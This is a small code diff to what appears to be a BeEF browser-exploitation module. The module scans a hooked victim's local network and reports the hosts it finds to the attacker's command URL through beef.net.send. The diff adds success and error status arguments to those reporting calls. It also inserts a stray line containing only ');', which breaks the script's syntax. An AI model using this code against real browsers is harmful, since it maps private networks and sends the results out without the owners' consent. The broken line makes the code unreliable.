@@ -102,13 +102,14 @@ var doScan = function(timeout) {
         beef.debug("Returned large hit rate (" + discovered_hosts.length + " of " + count + ") indicating low network latency. Retrying scan with decreased timeout (" + (timeout - 500) + "ms)");
         doScan(timeout-500);
       } else {
-        beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unexpected results&hosts="+hosts);
+        beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=unexpected results&hosts="+hosts, beef.are.status_error());
       }
     } else if (discovered_hosts.length == 0) {
       beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=no results", beef.are.status_error());
     } else {
       beef.debug("[command #<%= @command_id %>] Identifying LAN hosts completed.");
-      beef.net.send('<%= @command_url %>', <%= @command_id %>, 'hosts='+hosts);
+      beef.net.send('<%= @command_url %>', <%= @command_id %>, 'hosts='+hosts, beef.are.status_success());
+);
       beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=scan complete");
     }
   }
